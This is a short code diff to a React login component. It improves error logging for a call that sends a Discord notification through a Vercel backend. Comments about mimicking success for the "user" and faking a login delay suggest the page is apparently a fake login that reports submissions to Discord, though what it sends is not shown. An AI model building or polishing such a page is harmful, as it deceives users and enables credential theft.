@@ -122,12 +122,15 @@ export default function App() {
       });
 
       if (!response.ok) {
-        const errorData = await response.json();
-        console.error("Errore server:", errorData);
-        // We still proceed to mimic success for the "user" but we log the error
+        const errorData = await response.json().catch(() => ({}));
+        console.error("Errore server (Vercel):", response.status, errorData);
+        // Alert per debugging (opzionale, utile per l'utente)
+        console.warn("La notifica non è stata inviata correttamente a Discord. Controlla i log di Vercel.");
+      } else {
+        console.log("Notifica Discord inviata con successo!");
       }
     } catch (error) {
-      console.error("Errore connessione API:", error);
+      console.error("Errore di rete o connessione API:", error);
     }
 
     // Mimic actual login delay
